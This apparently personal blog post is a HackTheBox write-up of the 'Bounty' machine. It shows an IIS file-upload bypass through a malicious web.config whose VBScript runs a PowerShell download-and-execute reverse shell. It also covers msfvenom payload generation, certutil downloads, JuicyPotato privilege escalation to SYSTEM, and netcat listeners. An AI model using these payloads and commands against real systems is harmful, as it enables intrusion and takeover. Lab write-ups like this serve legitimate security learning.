---
layout: post
title: "Bounty Writeup - HackTheBox"
category: HackTheBox
---

# HTB lab Machine - Bounty

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.67.67 folder that I have attached to this post.

## Enumeration summary

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

```
/UploadedFiles        (Status: 301) [Size: 157] [--> http://10.129.67.67/UploadedFiles/]

```

Run dirbuster:

```
php, pl, sh, asp, html, json, py, cfm, aspx, rb, cgi
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
http://10.129.67.67
```

Result:

![image-20210527091008119.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210527091008119.png)

## Exploitation

Lets generate a reverse shell:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.51 LPORT=4242 -f aspx > reverse.aspx
```

I tried uploading it in the upload page. Yet it gave me back the file was unvalid. Maybe Windows Defender blocking it. Or just bad architecture. So I tried around with different payload/encoding and stuff like that. Came up with this:

```
/usr/share/webshells/aspx/cmdasp.aspx
mv cmdasp.aspx cmdasp.aspx.png
```

![image-20210527095436103.png](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210527095436103.png)

But launching that uploaded files in `uploadedfiles/cmdasp.aspx.png` is not working. So I did some google-fu and found this: https://soroush.secproject.com/blog/tag/unrestricted-file-upload/ Which made me create this web.config file:

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.51/mini-reverse.ps1')")
%>

```

This is mini-reverse: https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1

Start listener for 4444:

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ nc -lvp 4444                                                                                                   1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.51] from 10.129.152.190 [10.129.152.190] 49159
id

id

whoami
bounty\merlin

cd Users\
```

Its juicypotato time:

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

Get-ChildItem -Recurse . user.txt
'Get-ChildItem' is not recognized as an internal or external command,
operable program or batch file.

systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          5/27/2021, 5:37:17 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,565 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,541 MB
Virtual Memory: In Use:    554 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.152.190
                                 [02]: fe80::9428:ae5:ed84:6256
                                 [03]: dead:beef::9428:ae5:ed84:6256

```

This is how I got user flag btw:

```
PS C:\users\merlin> cd desktop
PS C:\users\merlin\desktop> dir
PS C:\users\merlin\desktop> ls -al
PS C:\users\merlin\desktop> gci -force

    Directory: C:\users\merlin\desktop

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a-hs         5/30/2018  12:22 AM        282 desktop.ini
-a-h-         5/30/2018  11:32 PM         32 user.txt

PS C:\users\merlin\desktop> type user.txt
e29ad89891462e0b09741e3082f44a2f
PS C:\users\merlin\desktop>

```

Juicypotato:

```
PS C:\users\merlin\desktop> certutil -urlcache -f http://10.10.14.51/shell.exe shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\users\merlin\desktop> certutil -urlcache -f http://10.10.14.51/jp.exe jp.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\users\merlin\desktop> dir

    Directory: C:\users\merlin\desktop

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         5/27/2021   6:11 PM     347648 jp.exe
-a---         5/27/2021   6:09 PM      28160 nc.exe
-a---         5/27/2021   6:11 PM       7168 shell.exe

PS C:\users\merlin\desktop> jp.exe -t * -p shell.exe -l 9999
PS C:\users\merlin\desktop> whoami
bounty\merlin
PS C:\users\merlin\desktop> .\jp.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port

Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
PS C:\users\merlin\desktop> .\jp.exe -t * -p shell.exe -l 9999
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9999
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
PS C:\users\merlin\desktop>
```

On your kali machine:

```
┌──(kali㉿kali)-[~/Desktop/DownloadedScripts]
└─$ nc -lvp 9999
listening on [any] 9999 ...
connect to [10.10.14.51] from 10.129.152.190 [10.129.152.190] 49181
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd ../../Users/administrator
cd ../../Users/administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of C:\Users\Administrator

05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
05/31/2018  12:18 AM    <DIR>          Contacts
05/31/2018  12:18 AM    <DIR>          Desktop
05/31/2018  07:00 AM    <DIR>          Documents
06/11/2018  12:15 AM    <DIR>          Downloads
05/31/2018  12:18 AM    <DIR>          Favorites
05/31/2018  12:18 AM    <DIR>          Links
05/31/2018  12:18 AM    <DIR>          Music
05/31/2018  12:18 AM    <DIR>          Pictures
05/31/2018  12:18 AM    <DIR>          Saved Games
05/31/2018  12:18 AM    <DIR>          Searches
05/31/2018  12:18 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  11,883,474,944 bytes free

C:\Users\Administrator>cd desktop
cd desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0

 Directory of C:\Users\Administrator\Desktop

05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
05/31/2018  12:18 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  11,883,474,944 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
c837f7b699feef5475a0c079f9d4f5ea
C:\Users\Administrator\Desktop>

```

## Exploitation

That foothold was not that easy, but the machine itself was nice 20pts
